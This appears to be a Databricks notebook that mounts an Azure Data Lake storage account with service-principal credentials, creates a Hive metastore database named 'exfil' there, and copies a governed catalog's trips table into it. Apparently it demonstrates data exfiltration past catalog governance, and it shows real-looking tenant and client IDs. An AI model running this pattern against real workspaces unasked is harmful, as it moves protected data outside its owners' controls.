# Databricks notebook source
configs = {
    "fs.azure.account.auth.type": "OAuth",
    "fs.azure.account.oauth.provider.type": "org.apache.hadoop.fs.azurebfs.oauth2.ClientCredsTokenProvider",
    "fs.azure.account.oauth2.client.id": "d9126b61-1969-4a40-b9e1-e8a660c89b3f",
    "fs.azure.account.oauth2.client.secret": dbutils.secrets.get(scope="sp", key="secret"),
    "fs.azure.account.oauth2.client.endpoint": "https://login.microsoftonline.com/c7ebcae8-dc67-4fc2-b8c6-51fe7b27e2b2/oauth2/token"
}

# COMMAND ----------

dbutils.fs.mount(
    source = "abfss://dbfs@asoseadls.dfs.core.windows.net/",
    mount_point = "/mnt/asodbfs",
    extra_configs = configs
)

# COMMAND ----------

# MAGIC %sql
# MAGIC CREATE DATABASE hive_metastore.exfil
# MAGIC LOCATION "/mnt/asodbfs"

# COMMAND ----------

# MAGIC %sql
# MAGIC CREATE TABLE hive_metastore.exfil.trips AS
# MAGIC SELECT * FROM aso_fe_catalog.default.trips
